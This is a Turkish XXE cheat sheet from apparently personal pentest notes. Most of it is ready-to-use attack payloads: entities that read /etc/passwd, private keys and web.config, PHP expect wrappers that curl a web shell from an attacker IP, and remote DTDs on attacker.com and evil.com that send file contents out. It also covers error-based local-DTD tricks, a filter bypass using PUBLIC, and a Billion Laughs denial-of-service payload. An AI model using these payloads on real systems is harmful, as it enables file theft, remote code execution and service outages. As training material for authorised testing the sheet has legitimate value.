---
{"dg-publish":true,"permalink":"/cheat-sheet/xxe-cheat-sheet/"}
---


### 1- Temel DTD Tanımlama

```
<!DOCTYPE email SYSTEM "email.dtd">
```

Not :  XML payload'unu sunucuya gönderirken istekte `Content-Type: application/xml` ayarını yapmak yardımcı olabilir.

### 2-  External DTD Referansı

external entity --> `<!ENTITY entity_name SYSTEM “entity_value”>`

```
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

### 3- İnternal Entity Tanımlama ve Kullanımı

Internal Entity --> `<!ENTITY entity_name “entity_value”>`

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

```
...
<email>
   &company;
</email>
...
```

### 4- External ve Dosya Sistemi Entity'leri ile Veri Çekme

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

### 5- JSON’dan XML’e Dönüşüm ile XXE Testi

Not: Bazı web uygulamaları HTTP isteklerinde varsayılan olarak `JSON` formatını kullanabilir, ancak XML internal diğer formatları da kabul edebilir. Bu nedenle, bir web uygulaması istekleri JSON formatında gönderse bile, `Content-Type` header'ını `application/xml` olarak değiştirmeyi deneyebilir ve ardından JSON verilerini [online](https://www.convertjson.com/json-to-xml.htm) bir araçla XML'e dönüştürebiliriz. Web uygulaması isteği XML verileriyle kabul ederse, XXE güvenlik açıklarına karşı da test edebiliriz, bu da beklenmedik bir XXE güvenlik açığını ortaya çıkarabilir.

![Pasted image 20250515121631.png](/img/user/resimler/Pasted%20image%2020250515121631.png)

#### PayloadsAllTheThings JSON Endpoint'lerde XXE

HTTP isteğinde `Content-Type`'ı JSON'dan XML'e değiştirmeyi deneyin,

|Content Type|Data|
|---|---|
|`application/json`|`{"search":"name","value":"test"}`|
|`application/xml`|`<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>`|

* XML dokümanları, diğer tüm elementlerin parent'ı olan bir root (`<root>`) elementi içermelidir.
* Veriler de XML'e dönüştürülmelidir, aksi takdirde sunucu bir hata ile yanıt verecektir.

```
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

*  [NetSPI/Content-Type Converter](https://github.com/NetSPI/Burp-Extensions/releases/tag/1.4)



### 6- Hassas Dosya Okuma (Örn. /etc/passwd)

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

veya tek tırnak kullanılabilir . 

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

- En basit ve sade **Classic XXE** payload.
- `<!ENTITY test SYSTEM ...>` ile `file:///etc/passwd` dosyasının içeriği `&test;` tagı ile çağrılıyor.
- `root` elementi içerisinde `&test;` çağrılarak içerik XML çıktısına dahil ediliyor.

#### Avantajı:

- Parser, `DOCTYPE` ve `ENTITY` kullanımına izin veriyorsa çalışır.
- Oldukça yaygın ve çoğu eğitim platformunda kullanılır.

![Pasted image 20250513114117.png](/img/user/resimler/Pasted%20image%2020250513114117.png)

Not : CTF'ler için `id_rsa` dosyasını okuyabiliriz.


### 99- Farklı Exploit Yöntemleri 

#### Payload (Element Tanımıyla Birlikte)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

##### Özellikleri:

- `<!ELEMENT data (#ANY)>` ile `data` elementinin yapısı tanımlanmış.
- Bu tanım, XML Validator kullanan parser'lar için önemlidir. Bazı katı parser’lar element tanımı olmadan içeriği kabul etmez.
- `&file;` ifadesiyle `/etc/passwd` dosyasının içeriği `data` elementine enjekte edilir.

##### Avantajı:

- Daha katı DTD doğrulaması yapan XML parser’lar için uyumludur.
- Gerçek dünya senaryolarında veya eski Java/XML kütüphanelerinde daha işe yarar olabilir.


#### Payload (Element `foo` ile, ISO-8859-1 Kodlamasıyla)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

#####  Özellikleri:

- ISO-8859-1 encoding belirtilmiş.
- Element `foo` olarak tanımlanmış ve `ANY` türünde içerik alabilir.
- `&xxe;` entity’siyle `/etc/passwd` içeriği `foo` elementi içine yerleştiriliyor.

#####  Avantajı:

- Encoding belirtmek, bazı sistemlerde bypass etkisi yaratabilir.
- `<!ELEMENT foo ANY>` tanımı, `foo` elementinin her türlü içeriği kabul etmesini sağlar.
- Daha geniş uyumluluk sağlar.

#### Payload (Windows için Versiyonu)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>
```

####  Özellikleri:

- Yukarıdakiyle neredeyse aynı ama bu sefer Windows sistem hedeflenmiş.
- `file:///c:/boot.ini` ifadesiyle Windows’ta var olan bir dosya okunmaya çalışılır.
- `boot.ini` eski sistemlerde (Windows XP/2003 gibi) bulunan sistem yapılandırma dosyasıdır.
    

####  Avantajı:

- Hedef sistemin işletim sistemi Windows ise, test için kullanılır.
- Dosya yolları Windows’a göre düzenlenmiş.


##### Özet

| Payload | Hedef OS   | DTD Detayı | Element Tanımı | Encoding Belirtildi mi? | Not                              |
| ------- | ---------- | ---------- | -------------- | ----------------------- | -------------------------------- |
| 1       | Unix/Linux | Basit DTD  | Yok            | Hayır                   | En sade örnek                    |
| 2       | Unix/Linux | Detaylı    | Var (`data`)   | Hayır                   | Doğrulayıcı parser için daha iyi |
| 3       | Unix/Linux | Detaylı    | Var (`foo`)    | Evet (`ISO-8859-1`)     | Uyumluluk artırıcı               |
| 4       | Windows    | Detaylı    | Var (`foo`)    | Evet (`ISO-8859-1`)     | Windows hedefli                  |

### 99- SYSTEM ve PUBLIC syntax farklılıkları

`SYSTEM` ve `PUBLIC` neredeyse eşanlamlıdır.

XML DTD (Document Type Definition) içinde bir **external entity** tanımlarken iki temel yöntem kullanılır:

- `SYSTEM`
- `PUBLIC`

Her ikisi de dış bir kaynağa başvurur, ancak aralarında **amaç ve davranış farkı** vardır.

##### `SYSTEM`

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Bu, en yaygın kullanılan formdur. Burada `SYSTEM`, dış kaynağın bir **URL** olduğunu belirtir (local dosya veya remote URL olabilir).

- Sadece **bir URI/URL** alır.
- `file://`, `http://`, `ftp://` gibi protokollerle kullanılır.
- Genellikle **dış veri çekmek** için kullanılır.

##### `PUBLIC`

```xml
<!ENTITY xxe PUBLIC "Any TEXT" "http://example.com/payload.dtd">
```

`PUBLIC` aslında XML dünyasında **formel olarak tanımlanmış public entity’ler** için vardır (örneğin HTML DTD’leri gibi). Ama bazı parser’lar `PUBLIC` tanımındaki **ikinci parametreye gider ve içeriği çeker**.

##### Sözdizimi:

```xml
<!ENTITY xxe PUBLIC "PublicID" "URI">
```

- `"PublicID"` → Genelde görmezden gelinir veya bilgi amaçlıdır.
- `"URI"` → Asıl çekilmek istenen dış kaynağın URL’sidir.

#####  XXE Context'inde Kullanımı:

XXE saldırılarında genellikle `PUBLIC` şu şekilde kullanılır:

```xml
<!ENTITY % xxe PUBLIC "random text" "http://attacker.com/malicious.dtd">
```

Bu durumda:

- `PUBLIC` ifadesi görünürde bir **"açık tanım"** sunuyormuş gibi davranır.
- Ama asıl parser, `"http://attacker.com/malicious.dtd"` kısmına gider ve oradaki içeriği işler.
- Bu da genellikle **remote DTD injection (RDTD)** saldırısı için kullanılır.

#####  `SYSTEM` ve `PUBLIC` Karşılaştırması

| Özellik          | SYSTEM              | PUBLIC                                         |
| ---------------- | ------------------- | ---------------------------------------------- |
| Argüman Sayısı   | 1 (sadece URI)      | 2 (Public ID + URI)                            |
| Ana Amaç         | Dosya/URL referansı | Public tanım ama URI üzerinden içerik çeker    |
| XXE’de Kullanımı | Sık                 | Daha az yaygın ama bazı bypass’larda işe yarar |
| Remote DTD       | Evet                | Evet                                           |

#####  Güvenlik Amaçlı Farkı Kullanımı

Bazı **XML firewall** veya **parser güvenlik önlemleri** sadece `SYSTEM` kullanımını engeller ama `PUBLIC` kullanımına dikkat etmez. Bu durumda:

```xml
<!ENTITY % xxe SYSTEM "http://evil.com/payload.dtd">
```

engellenirken,

```xml
<!ENTITY % xxe PUBLIC "abc" "http://evil.com/payload.dtd">
```

**geçebilir**.

Bu da `PUBLIC` kullanımını **bypass aracı** haline getirir.

#####  Örnek Kullanım (Remote DTD ile `PUBLIC`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % xxe PUBLIC "abc" "http://attacker.com/malicious.dtd">
  %xxe;
]>
<root>test</root>
```

`malicious.dtd` dosyasında örneğin şu olabilir:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
```

Sonra XML'de `&exfiltrate;` çağrıldığında `/etc/passwd` içerik olarak saldırgana gider.


#####  Özet

- `SYSTEM`: Tek URL alır, basit ve sık kullanılır.
- `PUBLIC`: İki parametre alır (public ID + URI), genellikle ikinci parametre üzerinden dosya çekilir.
- `PUBLIC`, bazı durumlarda `SYSTEM` yasaklıyken **bypass** için kullanılabilir.
- Her iki yöntem de **remote DTD injection** veya **classic XXE** için uygundur.

### 99-Classic XXE Base64 Encoded

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

```
ZmlsZTovLy9ldGMvcGFzc3dk --> file:///etc/passwd
```

### 7- XML Format Uyumsuzluğu ve Sınırlamalar

![Pasted image 20250513114348.png](/img/user/resimler/Pasted%20image%2020250513114348.png)

Gördüğümüz gibi, herhangi bir içerik alamadığımız için bu işe yaramadı. Bunun nedeni, başvurduğumuz dosyanın uygun bir XML formatında olmaması, dolayısıyla external bir XML entity olarak başvurulamamasıdır. Eğer bir dosya XML'in bazı özel karakterlerini (örn. `<`/`>`/`&`) içeriyorsa, external entity referansını bozar ve referans için kullanılamaz. Ayrıca, XML formatına uymayacağı için herhangi bir binary veriyi de okuyamayız.

### 8- Base64 Kodlama ile Dosya İçeriği Okuma (PHP)

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

![Pasted image 20250513114705.png](/img/user/resimler/Pasted%20image%2020250513114705.png)

### 9- PHP Expect Filtresi ile Komut Yürütme

`PHP://expect` filtresi aracılığıyla PHP tabanlı web uygulamalarında komutları çalıştırabiliriz, ancak bunun için PHP `expect` modülünün yüklü ve etkin olması gerekir.

XXE çıktısını doğrudan 'bu bölümde gösterildiği gibi' yazdırırsa, temel komutları `expect://id` olarak çalıştırabiliriz ve sayfa komut çıktısını yazdırmalıdır. Ancak, çıktıya erişimimiz yoksa veya 'örneğin reverse shell' gibi daha karmaşık bir komut çalıştırmamız gerekiyorsa, XML sözdizimi bozulabilir ve komut çalışmayabilir.

### 10- Web Shell Yükleme ile Remote Komut Yürütme

```shell-session
C4RT3L@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
C4RT3L@htb[/htb]$ sudo python3 -m http.server 80
```

Şimdi, web shell'imizi remote server'a indiren bir curl komutu çalıştırmak için aşağıdaki XML kodunu kullanabiliriz:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Not: XML sözdizimini bozmamak için yukarıdaki XML kodundaki tüm boşlukları `$IFS` ile değiştirdik. Ayrıca, `|`, `>` ve `{` gibi diğer birçok karakter kodu bozabilir, bu nedenle bunları kullanmaktan kaçınmalıyız.


### 99- Alternatif PHP Wrapper (Çalışma Olasılığı Çok az)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

`php://filter` ile **remote bir HTTP kaynağını (`http://10.0.0.3`)** okutup, Base64 encode etmek.

- `php://filter` sadece **local dosyalar** için güvenilidir. Genellikle `resource=` kısmında remote bir URL kullanmak **çalışmaz** çünkü PHP `file_get_contents()` çağrısı altında bu kombinasyonu desteklemez.

- Bazı özel konfigürasyonlarda (örneğin `allow_url_fopen=On`) bu davranış **kısmî olarak çalışabilir**, ancak genelde bu payload **yanıltıcıdır veya test amaçlıdır**.

- Eğer hedef sistemde PHP wrapper’lar **gereğinden fazla esnek** şekilde yapılandırılmışsa.

- Saldırgan remote bir dosya yüklemişse (örneğin: kötü amaçlı bir `.php` dosyası) ve onu encode etmek istiyorsa.


### 99-XInclude Attacks

`DOCTYPE` elementini değiştiremediğinizde, hedeflemek için `XInclude` kullanın

`XInclude`, XML dosyaları içinde **external içerik** (örneğin başka bir XML dosyası, metin dosyası vs.) eklemek için kullanılan **resmi bir XML standardıdır**. XML Parser bu etiketi gördüğünde, `href` ile gösterilen dosyanın içeriğini alıp yerine yerleştirir.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

| Parça                                        | Açıklama                                                                           |
| -------------------------------------------- | ---------------------------------------------------------------------------------- |
| `xmlns:xi="http://www.w3.org/2001/XInclude"` | Bu, XML dökümanında XInclude özelliğini kullanacağını belirtir (namespace tanımı). |
| `<xi:include ... />`                         | XInclude tagı — dışarıdan bir içerik dahil etmeyi ister.                           |
| `parse="text"`                               | İçeriğin **düz metin** olarak ele alınacağını belirtir.                            |
| `href="file:///etc/passwd"`                  | Hedeflenen dosya. Linux sistemlerde bu dosya, kullanıcı hesap bilgilerini içerir.  |

XXE saldırılarında genellikle `<!DOCTYPE ...>` tanımı gerekir çünkü external entity (`<!ENTITY xxe SYSTEM "...">`) tanımlamak için bu alan kullanılır.

Ama bazı durumlarda:

- Sunucu `DOCTYPE` tanımını **yasaklamış olabilir.**
- XML parser, sadece güvenli modda çalışıyor olabilir.
- Modern uygulamalar `DOCTYPE` içerikli XML'leri reddedebilir.

İşte tam bu durumda **`XInclude` bir alternatif saldırı vektörüdür**.

Eğer backend `libxml2` gibi bir parser kullanıyorsa ve `XInclude` özelliği aktifse, çalışır!

| Sınırlama                                        | Açıklama                                           |
| ------------------------------------------------ | -------------------------------------------------- |
| Parser `XInclude` desteklemeli                   | Her XML parser bu özelliği desteklemez.            |
| `href` genellikle file:// olmalı                 | SSRF gibi farklı URI şemaları desteklenmez.        |
| Bazı parser’lar bunu güvenlik nedeniyle engeller | Örneğin `Xerces` veya bazı Python XML parser’ları. |

| Özellik                           | Açıklama                                                       |
| --------------------------------- | -------------------------------------------------------------- |
| `DOCTYPE` olmadan çalışır         | Bu en büyük avantajıdır.                                       |
| Local dosya içeriğini dahil eder  | Özellikle `file:///etc/passwd`, `file:///app/config.yml` gibi. |
| Parser izin veriyorsa etkili olur | Her parser’da varsayılan olarak açık değildir.                 |
| Bypass amaçlı kullanılır          | `DOCTYPE` XXE’leri engellenmişse tercih edilir.                |

| Tavsiye                                                           | Açıklama                                              |
| ----------------------------------------------------------------- | ----------------------------------------------------- |
| `parse="text"` önemli                                             | Aksi halde XML olarak parse edilir ve hata dönebilir. |
| `file://` dışında `http://` da deneyebilirsin                     | Eğer SSRF etkisi varsa işe yarar.                     |
| `href="file:///c:/Windows/win.ini"`                               | Windows sistemlerde bunu deneyebilirsin.              |
| `XInclude` payload’larını loglar, hata mesajları vb. yerlerde ara | Direkt response vermeyebilir.                         |

### 11- DoS Saldırısı ile Entity Genişletme (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

Bu payload, `a0` varlığını DOS olarak tanımlar, `a1`'de birden çok kez referans verir, `a2`'de `a1`'e referans verir ve kendi kendine referans döngüleri nedeniyle back-end sunucunun belleği tükenene kadar bu şekilde devam eder. Ancak, bu saldırı artık modern web sunucularında (örneğin Apache) çalışmamaktadır, çünkü bunlar entity `self-reference`'a karşı koruma sağlamaktadır. 

### 12- CDATA ve Parametre Entity’leri ile Dosya Okuma

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

Bundan sonra, `&joined;` entity'sine başvurursak, escaped verilerimizi içermelidir. Ancak, XML internal ve external entity'leri birleştirmeyi engellediği için bu işe yaramayacaktır, bu yüzden bunu yapmak için daha iyi bir yol bulmamız gerekecektir.

Bu kısıtlamayı aşmak için, `%` karakteriyle başlayan ve yalnızca DTD içinde kullanılabilen özel bir entity türü olan XML Parametre Entity'lerini kullanabiliriz. Parametre entity'leri hakkında benzersiz olan şey, onlara bir external source'dan (örn. kendi sunucumuz) referans verirsek, hepsinin external olarak kabul edileceği ve aşağıdaki gibi birleştirilebileceğidir:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

Bu nedenle, `submitDetails.php` dosyasını önce yukarıdaki satırı bir DTD dosyasında (örneğin `xxe.dtd`) saklayarak okumaya çalışalım, makinemizde barındıralım ve ardından aşağıdaki gibi hedef web uygulamasında external bir entity olarak referans verelim:

```shell-session
C4RT3L@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
C4RT3L@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Şimdi, external entity'mize (`xxe.dtd`) referans verebilir ve ardından yukarıda tanımladığımız ve `submitDetails.php` dosyasının içeriğini içermesi gereken `&joined;` entity'sini aşağıdaki gibi yazdırabiliriz:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

`xxe.dtd` dosyamızı yazdıktan, makinemizde barındırdıktan ve ardından yukarıdaki satırları savunmasız web uygulamasına HTTP isteğimize ekledikten sonra, nihayet `submitDetails.php` dosyasının içeriğini alabiliriz:

![Pasted image 20250513123509.png](/img/user/resimler/Pasted%20image%2020250513123509.png)

### 13- Error Based XXE ile Dosya Okuma

Öncelikle hatalı biçimlendirilmiş (_malformed_) _XML_ verisi göndererek web uygulamasının herhangi bir hata gösterip göstermediğini kontrol edelim. Bunu yapmak için, kapanış taglarından birini silebilir, bir tagı yanlış yazarak kapatılmamasını sağlayabilir (örneğin `<roo>` yerine `<root>`), ya da var olmayan bir _entity_'ye referans verebiliriz. Örnek:

![Pasted image 20250513134521.png](/img/user/resimler/Pasted%20image%2020250513134521.png)

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

Yukarıdaki payload, `file` parameter entity'sini tanımlar ve ardından onu mevcut olmayan bir entity ile birleştirir. Önceki alıştırmamızda, üç stringi birleştiriyorduk. Bu durumda, `%nonExistingEntity;` mevcut değildir, bu nedenle web uygulaması, hatanın bir parçası olarak birleştirilen `%file;` ile birlikte bu varlığın mevcut olmadığını belirten bir hata atacaktır. Hataya neden olabilecek, kötü bir URI veya başvurulan dosyada kötü karakterler olması gibi birçok başka değişken vardır.

Şimdi, external DTD kodumuzu çağırabilir ve ardından aşağıdaki gibi `error` entity'ye başvurabiliriz::

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Bu yöntem dosyaların kaynak kodunu okumak için de kullanılabilir. Tek yapmamız gereken DTD kodumuzdaki dosya adını okumak istediğimiz dosyayı gösterecek şekilde değiştirmektir (örneğin “`file:///var/www/html/submitDetails.php`”). Ancak, bu yöntem kaynak dosyaları okumak için önceki yöntem kadar güvenilir değildir, çünkü uzunluk sınırlamaları olabilir ve bazı özel karakterler yine de onu bozabilir.

### 99- Error Based - Using Local DTD File

Error based exfiltration mümkünse, birleştirme hileleri yapmak için hala local bir DTD'ye güvenebilirsiniz. Hata mesajının dosya adını içerdiğini doğrulamak için payload.

Amaç: Sistemde zaten var olan bir **yerel DTD dosyasını** (`fonts.dtd`) kullanarak **ek DTD içerikleri enjekte etmek**, ardından `file:///etc/passwd` gibi dosyaları **error üzerinden dışarıya sızdırmak.**

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

[GoSecure/dtd-finder](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md) - DTD'leri listeler ve bu local DTD'leri kullanarak XXE payload'ları oluşturur.

#### Linux Local DTD

Linux sistemlerinde zaten saklı olan DTD dosyalarının kısa listesi; bunları `locate .dtd` ile listeleyin:

```bash
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

1. Local DTD dahil ediliyor:

```
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
```

Bu satır, sistemde hali hazırda bulunan bir `.dtd` dosyasını içeri alır. Amaç, DTD içine **saldırgan tanımlar** yerleştirmek.



2. Sahte kapanış hilesiyle enjekte:

```
<!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
```

Bu satırda şu oluyor:

- `%constant` isimli bir parametre entity oluşturuluyor.
- İçinde **DTD içine kapanmamış tag enjekte edilerek** devamında zararlı `ENTITY` tanımları yazılıyor (DTD Injection).
- Buradaki amaç: **DTD içindeki kodu kırıp, bizim `<!ENTITY % file SYSTEM "...">` gibi yeni tanımlar sokmamıza izin vermek.**

Bu tetiklendiğinde, parser bu `file:///patt/[içerik]` yolunu çözmeye çalışır. `file:///patt/root:x:0:0...` gibi bir path denemesi yapılır.

Bu, gerçek dosya içeriğinin `error message` olarak **loglanmasına veya dışarıya sızmasına** neden olabilir.

```
%local_dtd;
```

Bu satırla, yukarıda tanımladığın tüm karmaşık injection DTD’ye **enjekte edilir**.

##### Neden bu yöntem kullanılıyor?

- Bazı uygulamalar `DOCTYPE` kullanımını engeller, ama sistemde `.dtd` dosyalarını **otomatik yükler**.
- Bu dosyalar içine yapılan enjekte ile **doğrudan dış dosya okumaları mümkün olur.**
- Hedef sistemden içerik sızdırmak için **parser hata mesajları kullanılır.**


##### Bu saldırı ne zaman işe yarar?

- XML parser DTD’leri çözüyorsa,
- Sistemdeki yerel `.dtd` dosyalarına erişim açıksa,
- DTD içeriği enjekte edilebiliyorsa,
- Parser hata mesajlarını (örneğin `file not found`) bir şekilde dışarı yansıtıyorsa (log, response vb.)


#### Windows Local DTD

[infosec-au/xxe-windows.md](https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79) dosyasındaki yükler.

![Pasted image 20250516003406.png](/img/user/resimler/Pasted%20image%2020250516003406.png)

* Local dosyayı ifşa et

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>
```

- Hedef sistemde _zaten bulunan_ bir **DTD dosyasına** (`cim20.dtd`) bağlanıyor.
- O dosya içindeki **enjekte edilebilir bir parametreyi** (`%SuperClass`) kullanarak dışardan `ENTITY` tanımlamaları enjekte ediyor.
- Sonra bu `ENTITY`'ler ile hedefteki dosya (veya HTTP yanıtı) **bir hata mesajı aracılığıyla** dışa sızdırılıyor


| Satır                                                                   | Açıklama                                                                                           |
| ----------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| `<!ENTITY % local_dtd SYSTEM ...>`                                      | Sistemde bulunan DTD dosyasını içeri alır. Bu dosyada `%SuperClass` diye bir parametre entity var. |
| `<!ENTITY % SuperClass '`                                               | Bu satırdan sonra, `%SuperClass` entity'si _bizim_ tarafımızdan yeniden tanımlanır.                |
| `<!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">` | `file` adlı bir parametre entity tanımlanır. Bu entity, hedef dosyayı okur.                        |
| `<!ENTITY &#x25; eval ...>`                                             | Hatalı bir `SYSTEM` URI yaratır: `file://t/#...` böylece parser hata üretirken içerik açığa çıkar. |
| `&#x25;eval;` ve `&#x25;error;`                                         | Bu tanımlanan entity'leri **tetikler** (çalıştırır).                                               |
| `%local_dtd;`                                                           | Yukarıdaki satırları `cim20.dtd` içindeki `%SuperClass` konumuna **enjekte eder**.                 |

XML parser:

- `D:\webserv2\services\web.config` dosyasını okur,
- Onu `file://t/#...` URI’sine gömer,
- Böylece hata mesajı üretirken **web.config içeriğini hata mesajına dahil eder**.


* HTTP Response'unu İfşa Et

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>
```

Bu sefer:

- `file` entity'si **bir web sayfasını ([`https://erp.company.com`](https://erp.company.com))** okuyor.
- Eğer XML parser **internet bağlantısına izin veriyorsa**, bu URL'deki **HTTP cevabın içeriğini** `file` entity'sine yüklemiş olur.
- Ardından aynı error-based sızdırma tekniğiyle bu içerik hata mesajında gösterilir.

Sunucu içerisinden sadece dosyalar değil, **başka sunuculardan gelen HTTP yanıtları da** (örneğin intranet üzerindeki özel servisler) okunup dışa sızdırılabilir.


##### Neden Bu Kadar Karmaşık?

- `cim20.dtd` gibi dosyalarda tanımlı olan parametre entity'ler (`%SuperClass` gibi), bazı durumlarda **otomatik olarak çağrılır**.
- Saldırgan bu parametreyi **önceden tanımlayıp içine kendi payload'ını yerleştirdiğinde**, XML parser bunu **otomatik çağırır** ve içerik çalıştırılır.
- `&#x25;` (yani `%`) ve `&#x26;#x25;` (çift encode edilmiş `%`) gibi kodlamalar, parser'ın davranışını **gecikmeli** ve **katmanlı** hale getirir. Bu, bypass için kullanılır.

### 99- Error Based - Using Remote DTD 

**Payload to trigger the XXE**:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

ext.dtd'nin içeriği:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Alternative content of ext.dtd**:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

